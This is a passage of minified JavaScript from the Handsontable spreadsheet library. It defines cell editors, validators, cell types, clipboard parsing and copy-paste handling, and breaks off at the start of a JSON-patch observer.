n=this.instance.getSelected(),r;if(n[0]>n[2]){r=n[0];n[0]=n[2];n[2]=r}if(n[1]>n[3]){r=n[1];n[1]=n[3];n[3]=r}this.instance.populateFromArray(n[0],n[1],e,n[2],n[3],"edit")}else{this.instance.populateFromArray(this.row,this.col,e,null,null,"edit")}};t.prototype.beginEditing=function(t){if(this.state!=e.EditorState.VIRGIN){return}this.instance.view.scrollViewport(new WalkontableCellCoords(this.row,this.col));this.instance.view.render();this.state=e.EditorState.EDITING;t=typeof t=="string"?t:this.originalValue;this.setValue(e.helper.stringify(t));this.open();this._opened=true;this.focus();this.instance.view.render()};t.prototype.finishEditing=function(t,n,r){if(r){var i=this._closeCallback;this._closeCallback=function(e){if(i){i(e)}r(e)}}if(this.isWaiting()){return}if(this.state==e.EditorState.VIRGIN){var s=this;this.instance._registerTimeout(setTimeout(function(){s._fireCallbacks(true)},0));return}if(this.state==e.EditorState.EDITING){if(t){this.cancelChanges();return}var o=[[String.prototype.trim.call(this.getValue())]];this.state=e.EditorState.WAITING;this.saveValue(o,n);if(this.instance.getCellValidator(this.cellProperties)){var s=this;this.instance.addHookOnce("afterValidate",function(t){s.state=e.EditorState.FINISHED;s.discardEditor(t)})}else{this.state=e.EditorState.FINISHED;this.discardEditor(true)}}};t.prototype.cancelChanges=function(){this.state=e.EditorState.FINISHED;this.discardEditor()};t.prototype.discardEditor=function(t){if(this.state!==e.EditorState.FINISHED){return}if(t===false&&this.cellProperties.allowInvalid!==true){this.instance.selectCell(this.row,this.col);this.focus();this.state=e.EditorState.EDITING;this._fireCallbacks(false)}else{this.close();this._opened=false;this.state=e.EditorState.VIRGIN;this._fireCallbacks(true)}};t.prototype.isOpened=function(){return this._opened};t.prototype.isWaiting=function(){return this.state===e.EditorState.WAITING};e.editors.BaseEditor=t})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.init=function(){this.createElements();this.bindEvents();this.autoResize=autoResize()};t.prototype.getValue=function(){return this.TEXTAREA.value};t.prototype.setValue=function(e){this.TEXTAREA.value=e};var n=function(n){var r=this;var i=r.getActiveEditor();var s=e.helper.keyCode;var o=(n.ctrlKey||n.metaKey)&&!n.altKey;if(n.target!==i.TEXTAREA||n.isImmediatePropagationStopped()){return}if(n.keyCode===17||n.keyCode===224||n.keyCode===91||n.keyCode===93){n.stopImmediatePropagation();return}switch(n.keyCode){case s.ARROW_RIGHT:if(e.Dom.getCaretPosition(i.TEXTAREA)!==i.TEXTAREA.value.length){n.stopImmediatePropagation()}break;case s.ARROW_LEFT:if(e.Dom.getCaretPosition(i.TEXTAREA)!==0){n.stopImmediatePropagation()}break;case s.ENTER:var u=i.instance.getSelected();var a=!(u[0]===u[2]&&u[1]===u[3]);if(o&&!a||n.altKey){if(i.isOpened()){i.setValue(i.getValue()+"\n");i.focus()}else{i.beginEditing(i.originalValue+"\n")}n.stopImmediatePropagation()}n.preventDefault();break;case s.A:case s.X:case s.C:case s.V:if(o){n.stopImmediatePropagation()}break;case s.BACKSPACE:case s.DELETE:case s.HOME:case s.END:n.stopImmediatePropagation();break}};t.prototype.open=function(){this.refreshDimensions();this.instance.addHook("beforeKeyDown",n)};t.prototype.close=function(){this.textareaParentStyle.display="none";this.autoResize.unObserve();if(document.activeElement===this.TEXTAREA){this.instance.listen()}this.instance.removeHook("beforeKeyDown",n)};t.prototype.focus=function(){this.TEXTAREA.focus();e.Dom.setCaretPosition(this.TEXTAREA,this.TEXTAREA.value.length)};t.prototype.createElements=function(){this.$body=$(document.body);this.TEXTAREA=document.createElement("TEXTAREA");this.$textarea=$(this.TEXTAREA);e.Dom.addClass(this.TEXTAREA,"handsontableInput");this.textareaStyle=this.TEXTAREA.style;this.textareaStyle.width=0;this.textareaStyle.height=0;this.TEXTAREA_PARENT=document.createElement("DIV");e.Dom.addClass(this.TEXTAREA_PARENT,"handsontableInputHolder");this.textareaParentStyle=this.TEXTAREA_PARENT.style;this.textareaParentStyle.top=0;this.textareaParentStyle.left=0;this.textareaParentStyle.display="none";this.TEXTAREA_PARENT.appendChild(this.TEXTAREA);this.instance.rootElement[0].appendChild(this.TEXTAREA_PARENT);var t=this;this.instance._registerTimeout(setTimeout(function(){t.refreshDimensions()},0))};t.prototype.checkEditorSection=function(){if(this.row<this.instance.getSettings().fixedRowsTop){if(this.col<this.instance.getSettings().fixedColumnsLeft){return"corner"}else{return"top"}}else{if(this.col<this.instance.getSettings().fixedColumnsLeft){return"left"}}};t.prototype.getEditedCell=function(){var e=this.checkEditorSection(),t;switch(e){case"top":t=this.instance.view.wt.wtScrollbars.vertical.clone.wtTable.getCell({row:this.row,col:this.col});this.textareaParentStyle.zIndex=101;break;case"corner":t=this.instance.view.wt.wtScrollbars.corner.clone.wtTable.getCell({row:this.row,col:this.col});this.textareaParentStyle.zIndex=103;break;case"left":t=this.instance.view.wt.wtScrollbars.horizontal.clone.wtTable.getCell({row:this.row,col:this.col});this.textareaParentStyle.zIndex=102;break;default:t=this.instance.getCell(this.row,this.col);this.textareaParentStyle.zIndex="";break}return t!=-1&&t!=-2?t:void 0};t.prototype.refreshDimensions=function(){if(this.state!==e.EditorState.EDITING){return}this.TD=this.getEditedCell();if(!this.TD){return}var t=$(this.TD);var n=e.Dom.offset(this.TD);var r=e.Dom.offset(this.instance.rootElement[0]);var i=n.top-r.top-1;var s=n.left-r.left-1;var o=this.instance.getSettings();var u=o.rowHeaders===false?0:1;var a=o.colHeaders===false?0:1;var f=this.checkEditorSection();if(i<0){i=0}if(s<0){s=0}if(u>0&&parseInt(t.css("border-top-width"),10)>0){i+=1}if(a>0&&parseInt(t.css("border-left-width"),10)>0){s+=1}this.textareaParentStyle.top=i+"px";this.textareaParentStyle.left=s+"px";var l=this.TD.offsetTop-this.instance.view.wt.wtScrollbars.vertical.getScrollPosition(),c=this.TD.offsetLeft-this.instance.view.wt.wtScrollbars.horizontal.getScrollPosition();var h=t.width(),p=this.instance.view.maximumVisibleElementWidth(c)-10,d=t.outerHeight()-4,v=this.instance.view.maximumVisibleElementHeight(l)-2;if(parseInt(t.css("border-top-width"),10)>0){d-=1}if(parseInt(t.css("border-left-width"),10)>0){if(u>0){h-=1}}this.TEXTAREA.style.fontSize=e.Dom.getComputedStyle(this.TD).fontSize;this.TEXTAREA.style.fontFamily=e.Dom.getComputedStyle(this.TD).fontFamily;this.autoResize.init(this.TEXTAREA,{minHeight:Math.min(d,v),maxHeight:v,minWidth:Math.min(h,p),maxWidth:p});this.textareaParentStyle.display="block"};t.prototype.bindEvents=function(){var e=this;this.$textarea.on("cut.editor",function(e){e.stopPropagation()});this.$textarea.on("paste.editor",function(e){e.stopPropagation()});this.instance.addHook("afterScrollVertically",function(){e.refreshDimensions()})};e.editors.TextEditor=t;e.editors.registerEditor("text",e.editors.TextEditor)})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.beginEditing=function(){var e=this.TD.querySelector('input[type="checkbox"]');if(e){$(e).trigger("click")}};t.prototype.finishEditing=function(){};t.prototype.init=function(){};t.prototype.open=function(){};t.prototype.close=function(){};t.prototype.getValue=function(){};t.prototype.setValue=function(){};t.prototype.focus=function(){};e.editors.CheckboxEditor=t;e.editors.registerEditor("checkbox",t)})(Handsontable);(function(e){var t=e.editors.TextEditor.prototype.extend();t.prototype.init=function(){if(!$.datepicker){throw new Error("jQuery UI Datepicker dependency not found. Did you forget to include jquery-ui.custom.js or its substitute?")}e.editors.TextEditor.prototype.init.apply(this,arguments);this.isCellEdited=false;var t=this;this.instance.addHook("afterDestroy",function(){t.destroyElements()})};t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);this.datePicker=document.createElement("DIV");e.Dom.addClass(this.datePicker,"htDatepickerHolder");this.datePickerStyle=this.datePicker.style;this.datePickerStyle.position="absolute";this.datePickerStyle.top=0;this.datePickerStyle.left=0;this.datePickerStyle.zIndex=99;document.body.appendChild(this.datePicker);this.$datePicker=$(this.datePicker);var t=this;var n={dateFormat:"yy-mm-dd",showButtonPanel:true,changeMonth:true,changeYear:true,onSelect:function(e){t.setValue(e);t.finishEditing(false)}};this.$datePicker.datepicker(n);this.$datePicker.on("mousedown",function(e){e.stopPropagation()});this.hideDatepicker()};t.prototype.destroyElements=function(){this.$datePicker.datepicker("destroy");this.$datePicker.remove()};t.prototype.open=function(){e.editors.TextEditor.prototype.open.call(this);this.showDatepicker()};t.prototype.finishEditing=function(t,n){this.hideDatepicker();e.editors.TextEditor.prototype.finishEditing.apply(this,arguments)};t.prototype.showDatepicker=function(){var e=$(this.TD);var t=e.offset();this.datePickerStyle.top=t.top+e.height()+"px";this.datePickerStyle.left=t.left+"px";var n={defaultDate:this.originalValue||void 0};$.extend(n,this.cellProperties);this.$datePicker.datepicker("option",n);if(this.originalValue){this.$datePicker.datepicker("setDate",this.originalValue)}this.datePickerStyle.display="block"};t.prototype.hideDatepicker=function(){this.datePickerStyle.display="none"};e.editors.DateEditor=t;e.editors.registerEditor("date",t)})(Handsontable);(function(e){"use strict";var t=e.editors.TextEditor.prototype.extend();t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);var t=document.createElement("DIV");t.className="handsontableEditor";this.TEXTAREA_PARENT.appendChild(t);this.$htContainer=$(t);this.$htContainer.handsontable()};t.prototype.prepare=function(t,n,r,i,s,o){e.editors.TextEditor.prototype.prepare.apply(this,arguments);var u=this;var a={startRows:0,startCols:0,minRows:0,minCols:0,className:"listbox",copyPaste:false,cells:function(){return{readOnly:true}},fillHandle:false,afterOnCellMouseDown:function(){var e=this.getValue();if(e!==void 0){u.setValue(e)}u.instance.destroyEditor()}};if(this.cellProperties.handsontable){a=$.extend(a,o.handsontable)}this.$htContainer.handsontable("destroy");this.$htContainer.handsontable(a)};var n=function(t){if(t.isImmediatePropagationStopped()){return}var n=this.getActiveEditor();var r=n.$htContainer.handsontable("getInstance");var i;if(t.keyCode==e.helper.keyCode.ARROW_DOWN){if(!r.getSelected()){i=0}else{var s=r.getSelected()[0];var o=r.countRows()-1;i=Math.min(o,s+1)}}else if(t.keyCode==e.helper.keyCode.ARROW_UP){if(r.getSelected()){var s=r.getSelected()[0];i=s-1}}if(i!==void 0){if(i<0){r.deselectCell()}else{r.selectCell(i,0)}t.preventDefault();t.stopImmediatePropagation();n.instance.listen();n.TEXTAREA.focus()}};t.prototype.open=function(){this.instance.addHook("beforeKeyDown",n);e.editors.TextEditor.prototype.open.apply(this,arguments);this.$htContainer.handsontable("render");if(this.cellProperties.strict){this.$htContainer.handsontable("selectCell",0,0);this.TEXTAREA.style.visibility="hidden"}else{this.$htContainer.handsontable("deselectCell");this.TEXTAREA.style.visibility="visible"}e.Dom.setCaretPosition(this.TEXTAREA,0,this.TEXTAREA.value.length)};t.prototype.close=function(){this.instance.removeHook("beforeKeyDown",n);this.instance.listen();e.editors.TextEditor.prototype.close.apply(this,arguments)};t.prototype.focus=function(){this.instance.listen();e.editors.TextEditor.prototype.focus.apply(this,arguments)};t.prototype.beginEditing=function(t){var n=this.instance.getSettings().onBeginEditing;if(n&&n()===false){return}e.editors.TextEditor.prototype.beginEditing.apply(this,arguments)};t.prototype.finishEditing=function(t,n){if(this.$htContainer.handsontable("isListening")){this.instance.listen()}if(this.$htContainer.handsontable("getSelected")){var r=this.$htContainer.handsontable("getInstance").getValue();if(r!==void 0){this.setValue(r)}}return e.editors.TextEditor.prototype.finishEditing.apply(this,arguments)};e.editors.HandsontableEditor=t;e.editors.registerEditor("handsontable",t)})(Handsontable);(function(e){var t=e.editors.HandsontableEditor.prototype.extend();t.prototype.init=function(){e.editors.HandsontableEditor.prototype.init.apply(this,arguments);var t=this.$htContainer.handsontable("getInstance");t.updateSettings({height:1});this.query=null;this.choices=[]};t.prototype.createElements=function(){e.editors.HandsontableEditor.prototype.createElements.apply(this,arguments);var t=function(){if(window.navigator.platform.indexOf("Mac")!=-1){return"htMacScroll"}else{return""}};this.$htContainer.addClass("autocompleteEditor");this.$htContainer.addClass(t())};var n=false;var r=function(t){n=false;var r=this.getActiveEditor();var i=e.helper.keyCode;if(e.helper.isPrintableChar(t.keyCode)||t.keyCode===i.BACKSPACE||t.keyCode===i.DELETE||t.keyCode===i.INSERT){r.instance._registerTimeout(setTimeout(function(){r.queryChoices(r.TEXTAREA.value);n=true},0))}};t.prototype.prepare=function(){this.instance.addHook("beforeKeyDown",r);e.editors.HandsontableEditor.prototype.prepare.apply(this,arguments)};t.prototype.open=function(){e.editors.HandsontableEditor.prototype.open.apply(this,arguments);this.TEXTAREA.style.visibility="visible";this.focus();var t=this.$htContainer.handsontable("getInstance");var r=this;t.updateSettings({colWidths:[e.Dom.outerWidth(this.TEXTAREA)-2],afterRenderer:function(e,t,n,i,s){var o=this.getCellMeta(t,n).filteringCaseSensitive===true;var u=o?s.indexOf(this.query):s.toLowerCase().indexOf(r.query.toLowerCase());if(u!=-1){var a=s.substr(u,r.query.length);e.innerHTML=s.replace(a,"<strong>"+a+"</strong>")}}});if(n){n=false}r.instance._registerTimeout(setTimeout(function(){r.queryChoices(r.TEXTAREA.value)},0))};t.prototype.close=function(){e.editors.HandsontableEditor.prototype.close.apply(this,arguments)};t.prototype.queryChoices=function(t){this.query=t;if(typeof this.cellProperties.source=="function"){var n=this;this.cellProperties.source(t,function(e){n.updateChoicesList(e)})}else if(e.helper.isArray(this.cellProperties.source)){var r;if(!t||this.cellProperties.filter===false){r=this.cellProperties.source}else{var i=this.cellProperties.filteringCaseSensitive===true;var s=t.toLowerCase();r=this.cellProperties.source.filter(function(e){if(i){return e.indexOf(t)!=-1}else{return e.toLowerCase().indexOf(s)!=-1}})}this.updateChoicesList(r)}else{this.updateChoicesList([])}};t.prototype.updateChoicesList=function(n){var r=e.Dom.getCaretPosition(this.TEXTAREA),i=e.Dom.getSelectionEndPosition(this.TEXTAREA);var s=t.sortByRelevance(this.getValue(),n,this.cellProperties.filteringCaseSensitive);var o;if(this.cellProperties.filter!=false){var u=[];for(var a=0,f=s.length;a<f;a++){u.push(n[s[a]])}o=0;n=u}else{o=s[0]}this.choices=n;this.$htContainer.handsontable("loadData",e.helper.pivot([n]));this.$htContainer.handsontable("updateSettings",{height:this.getDropdownHeight()});if(this.cellProperties.strict===true){this.highlightBestMatchingChoice(o)}this.instance.listen();this.TEXTAREA.focus();e.Dom.setCaretPosition(this.TEXTAREA,r,r!=i?i:void 0)};t.prototype.finishEditing=function(t){if(!t){this.instance.removeHook("beforeKeyDown",r)}e.editors.HandsontableEditor.prototype.finishEditing.apply(this,arguments)};t.prototype.highlightBestMatchingChoice=function(e){if(typeof e==="number"){this.$htContainer.handsontable("selectCell",e,0)}else{this.$htContainer.handsontable("deselectCell")}};t.sortByRelevance=function(e,t,n){var r=[],i,s=e.length,o,u,a=[],f,l;if(s===0){for(f=0,l=t.length;f<l;f++){a.push(f)}return a}for(f=0,l=t.length;f<l;f++){i=t[f];if(n){o=i.indexOf(e)}else{o=i.toLowerCase().indexOf(e.toLowerCase())}if(o==-1){continue}u=i.length-o-s;r.push({baseIndex:f,index:o,charsLeft:u,value:i})}r.sort(function(e,t){if(t.index===-1)return-1;if(e.index===-1)return 1;if(e.index<t.index){return-1}else if(t.index<e.index){return 1}else if(e.index===t.index){if(e.charsLeft<t.charsLeft){return-1}else if(e.charsLeft>t.charsLeft){return 1}else{return 0}}});for(f=0,l=r.length;f<l;f++){a.push(r[f].baseIndex)}return a};t.prototype.getDropdownHeight=function(){var e=this.$htContainer.handsontable("getInstance").getRowHeight(0)||23;return this.choices.length>=10?10*e:this.choices.length*e+8;return 230};e.editors.AutocompleteEditor=t;e.editors.registerEditor("autocomplete",t)})(Handsontable);(function(e){var t=e.editors.TextEditor.prototype.extend();t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);this.TEXTAREA=document.createElement("input");this.TEXTAREA.setAttribute("type","password");this.TEXTAREA.className="handsontableInput";this.textareaStyle=this.TEXTAREA.style;this.textareaStyle.width=0;this.textareaStyle.height=0;this.$textarea=$(this.TEXTAREA);e.Dom.empty(this.TEXTAREA_PARENT);this.TEXTAREA_PARENT.appendChild(this.TEXTAREA)};e.editors.PasswordEditor=t;e.editors.registerEditor("password",t)})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.init=function(){this.select=document.createElement("SELECT");e.Dom.addClass(this.select,"htSelectEditor");this.select.style.display="none";this.instance.rootElement[0].appendChild(this.select)};t.prototype.prepare=function(){e.editors.BaseEditor.prototype.prepare.apply(this,arguments);var t=this.cellProperties.selectOptions;var n;if(typeof t=="function"){n=this.prepareOptions(t(this.row,this.col,this.prop))}else{n=this.prepareOptions(t)}e.Dom.empty(this.select);for(var r in n){if(n.hasOwnProperty(r)){var i=document.createElement("OPTION");i.value=r;e.Dom.fastInnerHTML(i,n[r]);this.select.appendChild(i)}}};t.prototype.prepareOptions=function(t){var n={};if(e.helper.isArray(t)){for(var r=0,i=t.length;r<i;r++){n[t[r]]=t[r]}}else if(typeof t=="object"){n=t}return n};t.prototype.getValue=function(){return this.select.value};t.prototype.setValue=function(e){this.select.value=e};var n=function(t){var n=this;var r=n.getActiveEditor();switch(t.keyCode){case e.helper.keyCode.ARROW_UP:var i=r.select.find("option:selected").prev();if(i.length==1){i.prop("selected",true)}t.stopImmediatePropagation();t.preventDefault();break;case e.helper.keyCode.ARROW_DOWN:var s=r.select.find("option:selected").next();if(s.length==1){s.prop("selected",true)}t.stopImmediatePropagation();t.preventDefault();break}};t.prototype.open=function(){var t=e.Dom.outerWidth(this.TD);var r=e.Dom.outerHeight(this.TD);var i=e.Dom.offset(this.instance.rootElement[0]);var s=e.Dom.offset(this.TD);this.select.style.height=r+"px";this.select.style.minWidth=t+"px";this.select.style.top=s.top-i.top+"px";this.select.style.left=s.left-i.left+"px";this.select.style.margin="0px";this.select.style.display="";this.instance.addHook("beforeKeyDown",n)};t.prototype.close=function(){this.select.style.display="none";this.instance.removeHook("beforeKeyDown",n)};t.prototype.focus=function(){this.select.focus()};e.editors.SelectEditor=t;e.editors.registerEditor("select",t)})(Handsontable);(function(e){var t=e.editors.AutocompleteEditor.prototype.extend();t.prototype.prepare=function(){e.editors.AutocompleteEditor.prototype.prepare.apply(this,arguments);this.cellProperties.filter=false;this.cellProperties.strict=true};e.editors.DropdownEditor=t;e.editors.registerEditor("dropdown",t)})(Handsontable);Handsontable.NumericValidator=function(e,t){if(e===null){e=""}t(/^-?\d*(\.|\,)?\d*$/.test(e))};var process=function(e,t){var n=e;var r=typeof n==="string"?n.toLowerCase():null;return function(e){var i=false;for(var s=0,o=e.length;s<o;s++){if(n===e[s]){i=true;break}else if(r===e[s].toLowerCase()){i=true;break}}t(i)}};Handsontable.AutocompleteValidator=function(e,t){if(this.strict&&this.source){typeof this.source==="function"?this.source(e,process(e,t)):process(e,t)(this.source)}else{t(true)}};Handsontable.AutocompleteCell={editor:Handsontable.editors.AutocompleteEditor,renderer:Handsontable.renderers.AutocompleteRenderer,validator:Handsontable.AutocompleteValidator};Handsontable.CheckboxCell={editor:Handsontable.editors.CheckboxEditor,renderer:Handsontable.renderers.CheckboxRenderer};Handsontable.TextCell={editor:Handsontable.editors.TextEditor,renderer:Handsontable.renderers.TextRenderer};Handsontable.NumericCell={editor:Handsontable.editors.TextEditor,renderer:Handsontable.renderers.NumericRenderer,validator:Handsontable.NumericValidator,dataType:"number"};Handsontable.DateCell={editor:Handsontable.editors.DateEditor,renderer:Handsontable.renderers.AutocompleteRenderer};Handsontable.HandsontableCell={editor:Handsontable.editors.HandsontableEditor,renderer:Handsontable.renderers.AutocompleteRenderer};Handsontable.PasswordCell={editor:Handsontable.editors.PasswordEditor,renderer:Handsontable.renderers.PasswordRenderer,copyable:false};Handsontable.DropdownCell={editor:Handsontable.editors.DropdownEditor,renderer:Handsontable.renderers.AutocompleteRenderer,validator:Handsontable.AutocompleteValidator};Handsontable.cellTypes={text:Handsontable.TextCell,date:Handsontable.DateCell,numeric:Handsontable.NumericCell,checkbox:Handsontable.CheckboxCell,autocomplete:Handsontable.AutocompleteCell,handsontable:Handsontable.HandsontableCell,password:Handsontable.PasswordCell,dropdown:Handsontable.DropdownCell};Handsontable.cellLookup={validator:{numeric:Handsontable.NumericValidator,autocomplete:Handsontable.AutocompleteValidator}};var autoResize=function(){var e={minHeight:200,maxHeight:300,minWidth:100,maxWidth:300},t,n=document.body,r=document.createTextNode(""),i=document.createElement("SPAN"),s=function(e,t,n){if(window.attachEvent){e.attachEvent("on"+t,n)}else{e.addEventListener(t,n,false)}},o=function(e,t,n){if(window.detachEvent){e.detachEvent("on"+t,n)}else{e.removeEventListener(t,n,false)}},u=function(){if(r.textContent!==void 0){r.textContent=t.value}else{r.data=t.value}i.style.fontSize=Handsontable.Dom.getComputedStyle(t).fontSize;i.style.fontFamily=Handsontable.Dom.getComputedStyle(t).fontFamily;n.appendChild(i);var s=i.clientWidth;n.removeChild(i);t.style.height=e.minHeight+"px";if(e.minWidth>s){t.style.width=e.minWidth+"px"}else if(s>e.maxWidth){t.style.width=e.maxWidth+"px"}else{t.style.width=s+"px"}var o=t.scrollHeight;if(e.minHeight>o){t.style.height=e.minHeight+"px"}else if(e.maxHeight<o){t.style.height=e.maxHeight+"px";t.style.overflowY="visible"}else{t.style.height=o+"px"}},a=function(){window.setTimeout(u,0)},f=function(n){if(n&&n.minHeight){if(n.minHeight=="inherit"){e.minHeight=t.clientHeight}else{var s=parseInt(n.minHeight);if(!isNaN(s)){e.minHeight=s}}}if(n&&n.maxHeight){if(n.maxHeight=="inherit"){e.maxHeight=t.clientHeight}else{var o=parseInt(n.maxHeight);if(!isNaN(o)){e.maxHeight=o}}}if(n&&n.minWidth){if(n.minWidth=="inherit"){e.minWidth=t.clientWidth}else{var u=parseInt(n.minWidth);if(!isNaN(u)){e.minWidth=u}}}if(n&&n.maxWidth){if(n.maxWidth=="inherit"){e.maxWidth=t.clientWidth}else{var a=parseInt(n.maxWidth);if(!isNaN(a)){e.maxWidth=a}}}if(!i.firstChild){i.className="autoResize";i.style.display="inline-block";i.appendChild(r)}},l=function(n,r){t=n;f(r);if(t.nodeName=="TEXTAREA"){t.style.resize="none";t.style.overflowY="";t.style.height=e.minHeight+"px";t.style.minWidth=e.minWidth+"px";t.style.maxWidth=e.maxWidth+"px";t.style.overflowY="hidden"}s(t,"change",u);s(t,"cut",a);s(t,"paste",a);s(t,"drop",a);s(t,"keydown",a);u()};return{init:function(e,t){l(e,t)},unObserve:function(){o(t,"change",u);o(t,"cut",a);o(t,"paste",a);o(t,"drop",a);o(t,"keydown",a)}}};(function(e){"use strict";function t(e){return e.split('"').length-1}e.SheetClip={parse:function(e){var n,r,i,s=[],o=0,u,a,f,l;i=e.split("\n");if(i.length>1&&i[i.length-1]===""){i.pop()}for(n=0,r=i.length;n<r;n+=1){i[n]=i[n].split("	");for(u=0,a=i[n].length;u<a;u+=1){if(!s[o]){s[o]=[]}if(f&&u===0){l=s[o].length-1;s[o][l]=s[o][l]+"\n"+i[n][0];if(f&&t(i[n][0])&1){f=false;s[o][l]=s[o][l].substring(0,s[o][l].length-1).replace(/""/g,'"')}}else{if(u===a-1&&i[n][u].indexOf('"')===0){s[o].push(i[n][u].substring(1).replace(/""/g,'"'));f=true}else{s[o].push(i[n][u].replace(/""/g,'"'));f=false}}}if(!f){o+=1}}return s},stringify:function(e){var t,n,r,i,s="",o;for(t=0,n=e.length;t<n;t+=1){for(r=0,i=e[t].length;r<i;r+=1){if(r>0){s+="	"}o=e[t][r];if(typeof o==="string"){if(o.indexOf("\n")>-1){s+='"'+o.replace(/"/g,'""')+'"'}else{s+=o}}else if(o===null||o===void 0){s+=""}else{s+=o}}if(t<n-1){s+="\n"}}return s}}})(window);var CopyPaste=function(){var e;return{getInstance:function(){if(!e){e=new CopyPasteClass}else if(e.hasBeenDestroyed()){e.init()}e.refCounter++;return e}}}();CopyPasteClass.prototype.init=function(){var e=this,t,n;this.copyCallbacks=[];this.cutCallbacks=[];this.pasteCallbacks=[];this.listenerElement=document.documentElement;n=document.body;if(document.getElementById("CopyPasteDiv")){this.elDiv=document.getElementById("CopyPasteDiv");this.elTextarea=this.elDiv.firstChild}else{this.elDiv=document.createElement("DIV");this.elDiv.id="CopyPasteDiv";t=this.elDiv.style;t.position="fixed";t.top="-10000px";t.left="-10000px";n.appendChild(this.elDiv);this.elTextarea=document.createElement("TEXTAREA");this.elTextarea.className="copyPaste";t=this.elTextarea.style;t.width="10000px";t.height="10000px";t.overflow="hidden";this.elDiv.appendChild(this.elTextarea);if(typeof t.opacity!=="undefined"){t.opacity=0}else{}}this.keydownListener=function(t){var n=false;if(t.metaKey){n=true}else if(t.ctrlKey&&navigator.userAgent.indexOf("Mac")===-1){n=true}if(n){if(document.activeElement!==e.elTextarea&&(e.getSelectionText()!=""||["INPUT","SELECT","TEXTAREA"].indexOf(document.activeElement.nodeName)!=-1)){return}e.selectNodeText(e.elTextarea);setTimeout(function(){e.selectNodeText(e.elTextarea)},0)}if(n&&(t.keyCode===67||t.keyCode===86||t.keyCode===88)){if(t.keyCode===88){setTimeout(function(){e.triggerCut(t)},0)}else if(t.keyCode===86){setTimeout(function(){e.triggerPaste(t)},0)}}};this._bindEvent(this.listenerElement,"keydown",this.keydownListener)};CopyPasteClass.prototype.selectNodeText=function(e){e.select()};CopyPasteClass.prototype.getSelectionText=function(){var e="";if(window.getSelection){e=window.getSelection().toString()}else if(document.selection&&document.selection.type!="Control"){e=document.selection.createRange().text}return e};CopyPasteClass.prototype.copyable=function(e){if(typeof e!=="string"&&e.toString===void 0){throw new Error("copyable requires string parameter")}this.elTextarea.value=e};CopyPasteClass.prototype.onCut=function(e){this.cutCallbacks.push(e)};CopyPasteClass.prototype.onPaste=function(e){this.pasteCallbacks.push(e)};CopyPasteClass.prototype.removeCallback=function(e){var t,n;for(t=0,n=this.copyCallbacks.length;t<n;t++){if(this.copyCallbacks[t]===e){this.copyCallbacks.splice(t,1);return true}}for(t=0,n=this.cutCallbacks.length;t<n;t++){if(this.cutCallbacks[t]===e){this.cutCallbacks.splice(t,1);return true}}for(t=0,n=this.pasteCallbacks.length;t<n;t++){if(this.pasteCallbacks[t]===e){this.pasteCallbacks.splice(t,1);return true}}return false};CopyPasteClass.prototype.triggerCut=function(e){var t=this;if(t.cutCallbacks){setTimeout(function(){for(var n=0,r=t.cutCallbacks.length;n<r;n++){t.cutCallbacks[n](e)}},50)}};CopyPasteClass.prototype.triggerPaste=function(e,t){var n=this;if(n.pasteCallbacks){setTimeout(function(){var r=(t||n.elTextarea.value).replace(/\n$/,"");for(var i=0,s=n.pasteCallbacks.length;i<s;i++){n.pasteCallbacks[i](r,e)}},50)}};CopyPasteClass.prototype.destroy=function(){if(!this.hasBeenDestroyed()&&--this.refCounter==0){if(this.elDiv&&this.elDiv.parentNode){this.elDiv.parentNode.removeChild(this.elDiv);this.elDiv=null;this.elTextarea=null}this._unbindEvent(this.listenerElement,"keydown",this.keydownListener)}};CopyPasteClass.prototype.hasBeenDestroyed=function(){return!this.refCounter};CopyPasteClass.prototype._bindEvent=function(){if(window.jQuery){return function(e,t,n){$(e).on(t+".copypaste",n)}}else{return function(e,t,n){e.addEventListener(t,n,false)}}}();CopyPasteClass.prototype._unbindEvent=function(){if(window.jQuery){return function(e,t,n){$(e).off(t+".copypaste",n)}}else{return function(e,t,n){e.removeEventListener(t,n,false)}}}();var jsonpatch;(function(e){function i(e){if(e.indexOf("/")===-1&&e.indexOf("~")===-1)return e;return e.replace(/~/g,"~0").replace(/\//g,"~1")}function s(e,t){var n;for(var r in e){if(e.hasOwnProperty(r)){if(e[r]===t){return i(r)+"/"}else if(typeof e[r]==="object"){n=s(e[r],t);if(n!=""){return i(r)+"/"+n}}}}return""}function o(e,t){if(e===t){return"/"}var n=s(e,t);if(n===""){throw new Error("Object not found in root")}return"/"+n}function l(e){for(var t=0,n=u.length;t<n;t++){if(u[t].obj===e){return u[t]}}}function c(e,t){for(var n=0,r=e.observers.length;n<r;n++){if(e.observers[n].callback===t){return e.observers[n].observer}}}function h(e,t){for(var n=0,r=e.observers.length;n<r;n++){if(e.observers[n].observer===t){e.observers.splice(n,1);return}}}function p(e,t){g(t);if(Object.observe){m(t,e)}else{clearTimeout(t.next)}var n=l(e);h(n,t)}function d(e,t){var n=[];var i=e;var s;var h=l(e);if(!h){h=new a(e);u.push(h)}else{s=c(h,t)}if(s){return s}if(Object.observe){s=function(u){m(s,e);v(s,e);var a=0,f=u.length;while(a<f){if(!(u[a].name==="length"&&w(u[a].object))&&!(u[a].name==="__Jasmine_been_here_before__")){var l=u[a].type;switch(l){case"new":l="add";break;case"deleted":l="delete";break;case"updated":l="update";break}r[l].call(u[a],n,o(i,u[a].object))}a++}if(n){if(t){t(n)}}s.patches=n;n=[]}}else{s={};h.value=JSON.parse(JSON.stringify(e));if(t){s.callback=t;s.next=null;var p=this.intervals||[100,1e3,1e4,6e4];var d=0;var y=function(){g(s)};var b=function(){clearTimeout(s.next);s.next=setTimeout(function(){y();d=0;s.next=setTimeout(E,p[d++])},0)};var E=function(){y();if(d==p.length)d=p.length-1;s.next=setTimeout(E,p[d++])};if(typeof window!=="undefined"){if(window.addEventListener){window.addEventListener("mousedown",b);window.addEventListener("mouseup",b);window.addEventListener("keydown",b)}else{window.attachEvent("onmousedown",b);window.attachEvent("onmouseup",b);window.attachEvent("onkeydown",b)}}s.next=setTimeout(E,p[d++])}}s.patches=n;s.object=e;h.observers.push(new f(t,s));return v(s,e)}function v(e,t){if(Object.observe){Object.observe(t,e);for(var n in t){if(t.hasOwnProperty(n)){var r=t[n];if(r&&typeof r==="object"){v(e,r)}}}}return e}function 